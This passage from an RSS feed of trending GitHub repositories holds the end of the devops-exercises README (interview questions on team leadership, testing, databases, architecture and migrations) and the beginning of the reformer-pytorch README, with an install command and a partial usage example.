&lt;h4&gt;&lt;a id="user-content-team-lead" class="anchor" aria-hidden="true" href="#team-lead"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Team Lead&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How would you improve productivity in your team?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-questions-you-can-ask" class="anchor" aria-hidden="true" href="#questions-you-can-ask"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Questions you CAN ask&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-questions-you-ask"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A list of questions you as a candidate can ask the interviewer during or after the interview.
These are only a suggestion, use them carefully. Not every interviewer will be able to answer these (or happy to) which should be perhaps a red flag warning for your regarding working in such place but that's really up to you.&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What do you like about working here?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How does the company promote personal growth?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the current level of technical debt you are dealing with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Be careful when asking this question - all companies, regardless of size, have some level of tech debt.
Phrase the question in the light that all companies have the deal with this, but you want to see the current
pain points they are dealing with &lt;br&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This is a great way to figure how managers deal with unplanned work, and how good they are at
setting expectations with projects.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What was your favorite project you've worked on?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This can give you insights in some of the cool projects a company is working on, and if
you would enjoy working on projects like these. This is also a good way to see if
the managers are allowing employees to learn and grow with projects outside of the
normal work you'd do.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;If you could change one thing about your day to day, what would it be?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Similar to the tech debt question, this helps you identify any pain points with the company.
Additionally, it can be a great way to show how you'd be an asset to the team.&lt;br&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;For Example, if they mention they have problem X, and you've solved that in the past,
you can show how you'd be able to mitigate that problem.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Let's say that we agree and you hire me to this position, after X months, what do you expect that I have achieved?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Not only this will tell you what is expected from you, it will also provide big hint on the type of work you are going to do in the first months of your job.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-testing" class="anchor" aria-hidden="true" href="#testing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Testing&lt;/h2&gt;
&lt;details&gt;
&lt;summary&gt;What types of tests would you run for web application?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are unit tests?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain test harness?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is A/B testing?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is network simulation and how do you perform it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What types of performances tests are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following types of tests:
&lt;ul&gt;
&lt;li&gt;Load Testing&lt;/li&gt;
&lt;li&gt;Stress Testing&lt;/li&gt;
&lt;li&gt;Capacity Testing&lt;/li&gt;
&lt;li&gt;Volume Testing&lt;/li&gt;
&lt;li&gt;Endurance Testing&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-databases" class="anchor" aria-hidden="true" href="#databases"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Databases&lt;/h2&gt;
&lt;details&gt;
&lt;summary&gt;What is a connection pool?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Connection Pool is a cache of database connections and the reason it's used is to avoid an overhead of establishing a connection for every query done to a database.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a connection leak?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A connection leak is a situation where database connection isn't closed after being created and is no longer needed.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Table Lock?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Your database performs slowly than usual. More specifically, your queries are taking a lot of time. What would you do?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Query for running queries and cancel the irrelevant queries&lt;/li&gt;
&lt;li&gt;Check for connection leaks (query for running connections and include their IP)&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Check for table locks and kill irrelevant locking sessions
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is a connection leak?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a Data Warehouse?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"A data warehouse is a subject-oriented, integrated, time-variant and non-volatile collection of data in support of organisation's decision-making process"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a data lake?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A single data source (at least usually) which is stored in a raw format.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is OLTP (Online transaction processing)?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is OLAP (Online Analytical Processing)?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-design" class="anchor" aria-hidden="true" href="#design"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design&lt;/h2&gt;
&lt;h4&gt;&lt;a id="user-content-architecture" class="anchor" aria-hidden="true" href="#architecture"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Architecture&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain "3-Tier Architecture" (including pros and cons)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the drawbacks of monolithic architecture?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Not suitable for frequent code changes and the ability to deploy new features&lt;/li&gt;
&lt;li&gt;Not designed for today's infrastructure (like public clouds)&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Scaling a team to work monolithic architecture is more challenging
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are the advantages of micro-services architecture over a monolithic architecture?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-scalability" class="anchor" aria-hidden="true" href="#scalability"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Scalability&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain Vertical Scaling&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Vertical Scaling is the process of adding resources to increase power of existing servers. For example, adding more CPUs, adding more RAM, etc.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain Horizontal Scaling&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Horizontal Scaling is the process of adding more resources that will be able handle requests as one unit
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you update each of the services in the following drawing without having app (foo.com) downtime?&lt;br&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="images/design/cdn-no-downtime.png"&gt;&lt;img src="images/design/cdn-no-downtime.png" width="200x;" height="300px;" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the problem with the following architecture and how would you fix it?&lt;br&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="images/design/producers_consumers_issue.png"&gt;&lt;img src="images/design/producers_consumers_issue.png" width="300x;" height="200px;" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The load on the producers or consumers may be high which will then cause them to hang or crash.&lt;br&gt;
Instead of working in "push mode", the consumers can pull tasks only when they are ready to handle them. It can be fixed by using a streaming platform like Kafka, Kinesis, etc. This platform will make sure to handle the high load/traffic and pass tasks/messages to consumers only when the ready to get them.&lt;/p&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="images/design/producers_consumers_fix.png"&gt;&lt;img src="images/design/producers_consumers_fix.png" width="300x;" height="200px;" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Users report that there is huge spike in process time when adding little bit more data to process as an input. What might be the problem?&lt;br&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="images/design/input-process-output.png"&gt;&lt;img src="images/design/input-process-output.png" width="300x;" height="200px;" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How would you scale the architecture from the previous question to hundreds of users?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-migrations" class="anchor" aria-hidden="true" href="#migrations"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Migrations&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How you prepare for a migration? (or plan a migration)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You can mention:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;roll-back &amp;amp; roll-forward
cut over
dress rehearsals
DNS redirection
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Branch by Abstraction" technique&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-exercises" class="anchor" aria-hidden="true" href="#exercises"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Exercises&lt;/h2&gt;
&lt;p&gt;Exercises are all about:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Setting up environments&lt;/li&gt;
&lt;li&gt;Writing scripts&lt;/li&gt;
&lt;li&gt;Designing and/or developing infrastructure apps&lt;/li&gt;
&lt;li&gt;Fixing existing applications&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Below you can find several exercises&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="exercises/write_dockerfile_run_container.md"&gt;Writing a Dockerfile and running a container&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/elk_kibana_aws.md"&gt;Elasticsearch &amp;amp; Kibana on AWS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/ansible_minikube_docker.md"&gt;Ansible, Minikube and Docker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/cloud_slack_bot.md"&gt;Cloud Slack bot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/jenkins_scripts.md"&gt;Jenkins: writing scripts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/jenkins_pipelines.md"&gt;Jenkins: writing pipelines&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/ci_for_open_source_project.md"&gt;CI for open source project&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/flask_container_ci/README.md"&gt;Flask, Containers and CI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="exercises/flask_container_ci2/README.md"&gt;Flask, Containers and CI 2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-credits" class="anchor" aria-hidden="true" href="#credits"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Credits&lt;/h2&gt;
&lt;p&gt;Thanks to all of our amazing &lt;a href="https://github.com/bregman-arie/devops-exercises/graphs/contributors"&gt;contributors&lt;/a&gt; who make it easy for everyone to learn new things :)&lt;/p&gt;
&lt;p&gt;Logos credits can be found &lt;a href="credits.md"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://creativecommons.org/licenses/by-nc-nd/3.0/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/e7ef37a8859a663b5ea5dce18c93ef7e351c6a22/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d434325323042592d2d4e432d2d4e44253230332e302d6c69676874677265792e737667" alt="License: CC BY-NC-ND 3.0" data-canonical-src="https://img.shields.io/badge/License-CC%20BY--NC--ND%203.0-lightgrey.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>bregman-arie</author><guid isPermaLink="false">https://github.com/bregman-arie/devops-exercises</guid><pubDate>Sun, 19 Jan 2020 00:03:00 GMT</pubDate></item><item><title>lucidrains/reformer-pytorch #4 in All Languages, Today</title><link>https://github.com/lucidrains/reformer-pytorch</link><description>&lt;p&gt;&lt;i&gt;Reformer, the efficient Transformer, implemented in Pytorch&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-reformer-the-efficient-transformer-in-pytorch" class="anchor" aria-hidden="true" href="#reformer-the-efficient-transformer-in-pytorch"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Reformer, the Efficient Transformer, in Pytorch&lt;/h1&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="./lsh_attention.png"&gt;&lt;img src="./lsh_attention.png" width="500" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a Pytorch implementation of Reformer &lt;a href="https://openreview.net/pdf?id=rkgNKkHtvB" rel="nofollow"&gt;https://openreview.net/pdf?id=rkgNKkHtvB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It includes LSH attention, reversible network, and chunking. It has been validated with an auto-regressive task (enwik8).&lt;/p&gt;
&lt;p&gt;Test 32k tokens with Colab &lt;a href="https://colab.research.google.com/drive/1am1DRl80Kd3o6n_4u3MomPzYS0NfdHAC" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/52feade06f2fecbf006889a904d221e6a730c194/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667" alt="Open In Colab" data-canonical-src="https://colab.research.google.com/assets/colab-badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-install" class="anchor" aria-hidden="true" href="#install"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Install&lt;/h2&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;pip install reformer_pytorch&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-usage" class="anchor" aria-hidden="true" href="#usage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Usage&lt;/h2&gt;
&lt;p&gt;A simple Reformer language model&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; should fit in ~ 5gb - 8k tokens&lt;/span&gt;

&lt;span class="pl-k"&gt;import&lt;/span&gt; torch
&lt;span class="pl-k"&gt;from&lt;/span&gt; reformer_pytorch &lt;span class="pl-k"&gt;import&lt;/span&gt; ReformerLM

model &lt;span class="pl-k"&gt;=&lt;/span&gt; ReformerLM(
    &lt;span class="pl-v"&gt;num_tokens&lt;/span&gt;&lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;20000&lt;/span&gt;,
    &lt;span class="pl-v"&gt;emb&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;512&lt;/span&gt;,
    &lt;span class="pl-v"&gt;depth&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;12&lt;/span&gt;,
    &lt;span class="pl-v"&gt;max_seq_len&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8192&lt;/span&gt;,
    &lt;span class="pl-v"&gt;heads&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8&lt;/span&gt;,
